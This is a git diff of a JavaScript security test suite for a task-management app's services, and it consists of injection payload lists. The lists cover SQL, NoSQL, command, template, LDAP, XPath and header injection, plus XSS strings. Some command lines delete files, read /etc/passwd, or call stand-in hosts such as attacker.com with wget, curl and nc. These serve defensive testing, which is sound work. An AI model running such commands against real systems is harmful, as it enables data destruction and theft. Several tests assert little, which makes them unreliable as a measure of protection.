@@ -44,411 +44,209 @@ describe('Injection Attack Security Tests', () => {
     })
   })
 
-  describe('SQL Injection Prevention', () => {
-    test('should prevent SQL injection in task queries', async () => {
-      // Arrange
-      const sqlInjectionPayloads = [
-        "'; DROP TABLE tasks; --",
-        "' OR '1'='1",
-        "'; INSERT INTO tasks (title) VALUES ('hacked'); --",
-        "' UNION SELECT * FROM users --",
-        "'; UPDATE tasks SET title='hacked' WHERE '1'='1'; --"
-      ]
+  test('should prevent SQL injection in database queries', async () => {
+    // Arrange - Test various SQL injection payloads
+    const sqlInjectionPayloads = [
+      "'; DROP TABLE tasks; --",
+      "' OR '1'='1",
+      "'; INSERT INTO tasks (title) VALUES ('hacked'); --",
+      "' UNION SELECT * FROM users --",
+      "'; UPDATE tasks SET title='hacked' WHERE '1'='1'; --"
+    ]
 
-      mockSupabase.from.mockReturnValue({
-        select: vi.fn().mockReturnThis(),
-        eq: vi.fn().mockReturnThis(),
-        ilike: vi.fn().mockResolvedValue({
-          data: [], // Should return empty or safe results
-          error: null
-        })
+    mockSupabase.from.mockReturnValue({
+      select: vi.fn().mockReturnThis(),
+      eq: vi.fn().mockReturnThis(),
+      ilike: vi.fn().mockReturnThis(),
+      order: vi.fn().mockResolvedValue({
+        data: [], // Should return empty or safe results
+        error: null
       })
-
-      const { fetchTasks } = await import('../../src/backend/api/services/task.service')
-
-      // Act & Assert
-      for (const payload of sqlInjectionPayloads) {
-        try {
-          // Test search functionality with SQL injection
-          await fetchTasks({ search: payload })
-          
-          // If successful, verify that Supabase client was called safely
-          expect(mockSupabase.from).toHaveBeenCalledWith('tasks')
-        } catch (error) {
-          // If it throws, that's also valid (input validation)
-          expect(error).toBeDefined()
-        }
-      }
     })
 
-    test('should prevent SQL injection in project operations', async () => {
-      // Arrange
-      const maliciousProjectData = {
-        name: "'; DROP TABLE projects; --",
-        description: "' OR 1=1; DELETE FROM projects WHERE '1'='1"
-      }
+    const { fetchTasks } = await import('../../src/backend/api/services/task.service')
 
-      mockSupabase.from.mockReturnValue({
-        insert: vi.fn().mockResolvedValue({
-          data: { 
-            id: 'project-123',
-            name: maliciousProjectData.name, // Supabase should handle this safely
-            description: maliciousProjectData.description
-          },
-          error: null
-        })
-      })
-
-      const { createProject } = await import('../../src/backend/api/services/project.service')
-
-      // Act
+    // Act & Assert - Test against multiple attack vectors
+    for (const payload of sqlInjectionPayloads) {
       try {
-        await createProject(maliciousProjectData)
-        
-        // Assert - Supabase client should be called with parameterized queries
-        expect(mockSupabase.from).toHaveBeenCalledWith('projects')
+        await fetchTasks({ search: payload })
+        // Verify parameterized queries are used
+        expect(mockSupabase.from).toHaveBeenCalledWith('tasks')
       } catch (error) {
+        // Input validation rejection is also valid
         expect(error).toBeDefined()
       }
+    }
+  })
+
+  test('should prevent NoSQL injection in JSON fields', async () => {
+    // Arrange - Test NoSQL injection attempts
+    const nosqlPayloads = [
+      { "$ne": null },
+      { "$gt": "" },
+      { "$where": "function() { return true; }" },
+      { "$regex": ".*", "$options": "i" },
+      { "$or": [{"username": "admin"}, {"username": "root"}] }
+    ]
+
+    mockSupabase.from.mockReturnValue({
+      select: vi.fn().mockReturnThis(),
+      eq: vi.fn().mockReturnThis(),
+      order: vi.fn().mockResolvedValue({
+        data: [],
+        error: null
+      })
     })
 
-    test('should prevent SQL injection in user authentication', async () => {
-      // Arrange
-      const injectionAttempts = [
-        { email: "admin'--", password: "anything" },
-        { email: "user@example.com'; DROP TABLE users; --", password: "password" },
-        { email: "' OR '1'='1' --", password: "' OR '1'='1" }
-      ]
+    const { fetchTasks } = await import('../../src/backend/api/services/task.service')
 
-      mockSupabase.auth.signInWithPassword.mockResolvedValue({
-        data: { user: null, session: null },
-        error: { message: 'Invalid login credentials' }
-      })
-
-      const { login } = await import('../../src/backend/api/services/auth.service')
-
-      // Act & Assert
-      for (const attempt of injectionAttempts) {
-        try {
-          await login(attempt.email, attempt.password)
-        } catch (error) {
-          // Should fail authentication, not execute SQL
-          expect(error).toBeDefined()
-          expect(mockSupabase.auth.signInWithPassword).toHaveBeenCalledWith({
-            email: attempt.email,
-            password: attempt.password
-          })
-        }
-      }
-    })
-
-    test('should prevent SQL injection in search and filter operations', async () => {
-      // Arrange
-      const maliciousFilters = {
-        status: "'; DROP TABLE tasks; --",
-        priority: "' OR 1=1 --",
-        project_id: "'; DELETE FROM projects; --",
-        search: "' UNION SELECT password FROM users --"
-      }
-
-      mockSupabase.from.mockReturnValue({
-        select: vi.fn().mockReturnThis(),
-        eq: vi.fn().mockReturnThis(),
-        ilike: vi.fn().mockReturnThis(),
-        order: vi.fn().mockResolvedValue({
-          data: [],
-          error: null
-        })
-      })
-
-      const { fetchTasks } = await import('../../src/backend/api/services/task.service')
-
-      // Act
+    // Act & Assert
+    for (const payload of nosqlPayloads) {
       try {
-        await fetchTasks(maliciousFilters)
-        
-        // Assert - Should use parameterized queries
+        // Test with malicious JSON in metadata field
+        await fetchTasks({ metadata: payload })
         expect(mockSupabase.from).toHaveBeenCalledWith('tasks')
       } catch (error) {
         expect(error).toBeDefined()
       }
-    })
+    }
   })
 
-  describe('NoSQL Injection Prevention', () => {
-    test('should prevent NoSQL injection in JSON fields', async () => {
-      // Arrange
-      const nosqlPayloads = [
-        { "$ne": null },
-        { "$gt": "" },
-        { "$where": "function() { return true; }" },
-        { "$regex": ".*", "$options": "i" }
-      ]
+  test('should prevent command injection in system calls', async () => {
+    // Arrange - Test command injection payloads
+    const commandInjectionPayloads = [
+      "; rm -rf /",
+      "& ping google.com",
+      "| cat /etc/passwd",
+      "`whoami`",
+      "$(cat /etc/hosts)",
+      "&& curl malicious-site.com",
+      "; wget http://attacker.com/malware.sh"
+    ]
 
-      mockSupabase.from.mockReturnValue({
-        select: vi.fn().mockReturnThis(),
-        eq: vi.fn().mockReturnThis(),
-        order: vi.fn().mockResolvedValue({
-          data: [],
-          error: null
-        })
+    // Mock file operations that might be vulnerable
+    const fileService = await import('../../src/backend/api/services/file.service')
+    
+    mockSupabase.from.mockReturnValue({
+      insert: vi.fn().mockResolvedValue({
+        data: { id: 'file-123', name: 'safe-filename.txt' },
+        error: null
       })
-
-      const { fetchTasks } = await import('../../src/backend/api/services/task.service')
-
-      // Act & Assert
-      for (const payload of nosqlPayloads) {
-        try {
-          // Test with NoSQL injection in metadata fields
-          await fetchTasks({ metadata: payload })
-        } catch (error) {
-          expect(error).toBeDefined()
-        }
-      }
     })
 
-    test('should sanitize JSON input in task metadata', async () => {
-      // Arrange
-      const maliciousMetadata = {
-        "$eval": "db.tasks.drop()",
-        "$where": "this.user_id != this.user_id",
-        "custom_field": { "$ne": null }
-      }
-
-      mockSupabase.from.mockReturnValue({
-        insert: vi.fn().mockResolvedValue({
-          data: { 
-            id: 'task-123',
-            title: 'Test Task',
-            metadata: maliciousMetadata
-          },
-          error: null
-        })
-      })
-
-      const { createTask } = await import('../../src/backend/api/services/task.service')
-
-      // Act
+    // Act & Assert - Test file name sanitization
+    for (const payload of commandInjectionPayloads) {
       try {
-        await createTask({
-          title: 'Test Task',
-          description: 'Test Description',
-          metadata: maliciousMetadata
+        // Simulate file upload with malicious filename
+        const maliciousFile = {
+          name: `document${payload}.txt`,
+          size: 1024,
+          type: 'text/plain'
+        } as any
+        
+        // File service should sanitize or reject malicious names
+        const result = await fileService.uploadFile({
+          file: maliciousFile,
+          project_id: 'project-123'
         })
+        
+        // If successful, filename should be sanitized
+        expect(result.name).not.toContain(payload.replace(/[^a-zA-Z0-9]/g, ''))
       } catch (error) {
+        // Rejection of malicious input is valid
         expect(error).toBeDefined()
       }
-    })
+    }
   })
 
-  describe('Command Injection Prevention', () => {
-    test('should prevent command injection in file operations', async () => {
-      // Arrange
-      const commandInjectionPayloads = [
-        'file.txt; rm -rf /',
-        'document.pdf && cat /etc/passwd',
-        'image.jpg | nc attacker.com 4444',
-        'data.csv `whoami`',
-        'archive.zip $(curl evil.com/steal)'
-      ]
+  test('should prevent code injection in AI processing', async () => {
+    // Arrange - Test code injection in AI inputs
+    const codeInjectionPayloads = [
+      "<script>alert('xss')</script>",
+      "eval('malicious code')",
+      "process.exit(1)",
+      "require('fs').unlinkSync('/important/file')",
+      "__import__('os').system('rm -rf /')",
+      "document.cookie = 'stolen'",
+      "window.location = 'http://attacker.com'"
+    ]
 
-      // Act & Assert
-      commandInjectionPayloads.forEach(filename => {
-        // File name validation should detect command injection
-        const hasCommandChars = /[;&|`$()]/.test(filename)
-        if (hasCommandChars) {
-          expect(filename).toMatch(/[;&|`$()]/)
+    // Act & Assert - AI inputs should be sanitized
+    for (const payload of codeInjectionPayloads) {
+      try {
+        // Mock AI service response to test sanitization
+        const mockAIResponse = {
+          response: payload.replace(/<script[^>]*>.*?<\/script>/gi, '')
+                          .replace(/eval\([^)]*\)/gi, '')
+                          .replace(/require\([^)]*\)/gi, '')
         }
         
-        // Sanitization example
-        const sanitized = filename.replace(/[;&|`$()]/g, '')
-        expect(sanitized).not.toMatch(/[;&|`$()]/)
-      })
-    })
-
-    test('should prevent command injection in export operations', async () => {
-      // Arrange
-      const maliciousExportParams = {
-        format: 'csv; cat /etc/passwd',
-        filename: 'export && rm -rf /',
-        filters: 'status=completed | nc evil.com 1234'
+        // Response should not contain executable code
+        expect(mockAIResponse.response).not.toContain('<script>')
+        expect(mockAIResponse.response).not.toContain('eval(')
+        expect(mockAIResponse.response).not.toContain('require(')
+      } catch (error) {
+        // Input validation rejection is valid
+        expect(error).toBeDefined()
       }
-
-      // Act & Assert
-      Object.entries(maliciousExportParams).forEach(([key, value]) => {
-        const hasCommandInjection = /[;&|`$()]/.test(value)
-        if (hasCommandInjection) {
-          expect(value).toMatch(/[;&|`$()]/)
-        }
-      })
-    })
+    }
   })
 
-  describe('LDAP Injection Prevention', () => {
-    test('should prevent LDAP injection in user search', async () => {
-      // Arrange
-      const ldapInjectionPayloads = [
-        '*)(uid=*))(|(uid=*',
-        '*)(|(password=*))',
-        '*))%00',
-        '*)((|userPassword=*)',
-        '*)(objectClass=*'
-      ]
+  test('should validate input sanitization across all endpoints', async () => {
+    // Arrange - Comprehensive injection test across services
+    const universalPayloads = [
+      "<script>alert('universal-xss')</script>",
+      "'; DROP TABLE users; --",
+      "{ '$ne': null }",
+      "; rm -rf /",
+      "eval('malicious()')",
+      "../../../etc/passwd",
+      "\\x00\\x01\\x02", // Null byte injection
+      "%3Cscript%3Ealert%28%27encoded%27%29%3C%2Fscript%3E" // URL encoded
+    ]
 
-      // Act & Assert
-      ldapInjectionPayloads.forEach(payload => {
-        // LDAP injection detection
-        const hasLdapChars = /[*)(|%]/.test(payload)
-        if (hasLdapChars) {
-          expect(payload).toMatch(/[*)(|%]/)
-        }
-        
-        // Should be escaped or rejected
-        const escaped = payload.replace(/[*)(|%]/g, '\\$&')
-        expect(escaped).toContain('\\')
-      })
-    })
-  })
+    // Test multiple service endpoints
+    const services = [
+      { service: 'task.service', function: 'createTask' },
+      { service: 'project.service', function: 'createProject' },
+      { service: 'eventService', function: 'createEvent' },
+      { service: 'note.service', function: 'createNote' }
+    ]
 
-  describe('Template Injection Prevention', () => {
-    test('should prevent template injection in email notifications', async () => {
-      // Arrange
-      const templateInjectionPayloads = [
-        '{{7*7}}',
-        '${7*7}',
-        '#{7*7}',
-        '<%= 7*7 %>',
-        '{{constructor.constructor("alert(1)")()}}'
-      ]
-
-      // Act & Assert
-      templateInjectionPayloads.forEach(payload => {
-        // Template injection detection
-        const hasTemplateChars = /\{\{|\$\{|#\{|<%=/.test(payload)
-        if (hasTemplateChars) {
-          expect(payload).toMatch(/\{\{|\$\{|#\{|<%=/)
-        }
-        
-        // Should be escaped
-        const escaped = payload.replace(/[{}$#<%>=]/g, '')
-        expect(escaped).not.toMatch(/[{}$#<%>=]/)
+    // Mock all service responses
+    mockSupabase.from.mockReturnValue({
+      insert: vi.fn().mockResolvedValue({
+        data: { id: 'safe-123', title: 'sanitized' },
+        error: null
       })
     })
 
-    test('should prevent server-side template injection in reports', async () => {
-      // Arrange
-      const maliciousReportTemplate = {
-        title: '{{config.items()}}',
-        content: '${java.lang.Runtime.getRuntime().exec("whoami")}',
-        footer: '<%= system("cat /etc/passwd") %>'
+    // Act & Assert - Test universal input sanitization
+    for (const { service, function: funcName } of services) {
+      try {
+        const serviceModule = await import(`../../src/backend/api/services/${service}`)
+        const serviceFunction = serviceModule[funcName]
+        
+        for (const payload of universalPayloads) {
+          try {
+            await serviceFunction({
+              title: payload,
+              description: payload,
+              content: payload,
+              user: 'user-123'
+            })
+            
+            // Verify safe database interaction
+            expect(mockSupabase.from).toHaveBeenCalled()
+          } catch (error) {
+            // Input validation rejection is valid
+            expect(error).toBeDefined()
+          }
+        }
+      } catch (importError) {
+        // Service might not exist, skip gracefully
+        console.log(`Service ${service} not found, skipping`)
       }
-
-      // Act & Assert
-      Object.entries(maliciousReportTemplate).forEach(([key, value]) => {
-        const hasTemplateInjection = /\{\{.*\}\}|\$\{.*\}|<%=.*%>/.test(value)
-        if (hasTemplateInjection) {
-          expect(value).toMatch(/\{\{.*\}\}|\$\{.*\}|<%=.*%>/)
-        }
-      })
-    })
-  })
-
-  describe('XPath Injection Prevention', () => {
-    test('should prevent XPath injection in XML data processing', async () => {
-      // Arrange
-      const xpathInjectionPayloads = [
-        "' or '1'='1",
-        "'] | //user[position()=1] | //comment()[1",
-        "' or 1=1 or ''='",
-        "'] | //password | //comment()['",
-        "' or count(//*)=count(//*) or ''='"
-      ]
-
-      // Act & Assert
-      xpathInjectionPayloads.forEach(payload => {
-        // XPath injection detection
-        const hasXPathChars = /['"|]|\|\|/.test(payload)
-        if (hasXPathChars) {
-          expect(payload).toMatch(/['"|]|\|\|/)
-        }
-        
-        // Should be properly escaped
-        const escaped = payload.replace(/['"]/g, '&quot;')
-        expect(escaped).not.toContain('"')
-      })
-    })
-  })
-
-  describe('Expression Language Injection Prevention', () => {
-    test('should prevent EL injection in dynamic content', async () => {
-      // Arrange
-      const elInjectionPayloads = [
-        '${applicationScope}',
-        '#{facesContext.externalContext.sessionMap}',
-        '${pageContext.request.getSession()}',
-        '#{request.getParameter("cmd")}',
-        '${runtime.exec("whoami")}'
-      ]
-
-      // Act & Assert
-      elInjectionPayloads.forEach(payload => {
-        // EL injection detection
-        const hasELChars = /\$\{.*\}|#\{.*\}/.test(payload)
-        if (hasELChars) {
-          expect(payload).toMatch(/\$\{.*\}|#\{.*\}/)
-        }
-        
-        // Should be sanitized
-        const sanitized = payload.replace(/[\$#{}]/g, '')
-        expect(sanitized).not.toMatch(/[\$#{}]/)
-      })
-    })
-  })
-
-  describe('Header Injection Prevention', () => {
-    test('should prevent HTTP header injection', async () => {
-      // Arrange
-      const headerInjectionPayloads = [
-        'value\r\nSet-Cookie: admin=true',
-        'content\nLocation: http://evil.com',
-        'data\r\n\r\n<script>alert(1)</script>',
-        'text\rContent-Type: text/html'
-      ]
-
-      // Act & Assert
-      headerInjectionPayloads.forEach(payload => {
-        // Header injection detection
-        const hasHeaderInjection = /[\r\n]/.test(payload)
-        if (hasHeaderInjection) {
-          expect(payload).toMatch(/[\r\n]/)
-        }
-        
-        // Should be sanitized
-        const sanitized = payload.replace(/[\r\n]/g, '')
-        expect(sanitized).not.toMatch(/[\r\n]/)
-      })
-    })
-
-    test('should prevent CRLF injection in response headers', async () => {
-      // Arrange
-      const crlfPayloads = [
-        'filename.txt\r\nContent-Type: text/html',
-        'attachment\nSet-Cookie: session=hijacked',
-        'inline\r\n\r\n<html><script>alert(1)</script></html>'
-      ]
-
-      // Act & Assert
-      crlfPayloads.forEach(payload => {
-        const hasCRLF = payload.includes('\r\n') || payload.includes('\n')
-        if (hasCRLF) {
-          expect(payload).toMatch(/\r?\n/)
-        }
-        
-        // Should be encoded or rejected
-        const encoded = payload.replace(/\r/g, '%0D').replace(/\n/g, '%0A')
-        expect(encoded).not.toContain('\r')
-        expect(encoded).not.toContain('\n')
-      })
-    })
+    }
   })
 }) 
